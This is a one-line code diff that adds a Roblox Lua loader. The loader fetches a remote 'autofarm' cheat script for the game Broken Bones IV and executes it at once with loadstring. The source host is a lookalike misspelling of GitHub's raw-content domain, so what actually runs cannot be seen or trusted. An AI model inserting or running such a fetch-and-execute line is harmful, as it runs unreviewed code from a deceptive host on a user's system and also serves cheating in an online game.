@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/0x88-debug/scripts_solara/main/BrokenBonesIV-autofarm.txt"))()
